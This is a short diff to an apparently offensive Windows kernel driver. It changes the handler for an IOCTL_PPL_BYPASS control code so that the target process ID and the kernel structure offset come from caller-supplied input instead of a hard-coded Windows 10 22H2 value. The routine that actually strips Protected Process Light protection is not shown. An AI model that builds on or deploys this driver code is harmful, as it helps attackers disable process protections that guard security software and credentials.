@@ -369,9 +369,13 @@ NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 		}
         case IOCTL_PPL_BYPASS:
         {
-            DWORD pidVal = *(DWORD*)Irp->AssociatedIrp.SystemBuffer;
+            //DWORD pidVal = *(DWORD*)Irp->AssociatedIrp.SystemBuffer;
             //int offset = *(int*)((ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer + 1);
-			int offset = 0x5fa; // Windows 10 22H2 x64 offset
+			pplData data = *(pplData*)Irp->AssociatedIrp.SystemBuffer;
+			ULONG_PTR pidVal = data.pid;
+			int offset = data.offset;
+            
+            //int offset = 0x5fa; // Windows 10 22H2 x64 offset
             status = pplBypass(pidVal, offset);
             if (!NT_SUCCESS(status)) {
                 DbgPrintEx(0, 0, "[%s] Failed to bypass PPL for PID %lu\n", DRIVER_NAME, (unsigned long)pidVal);
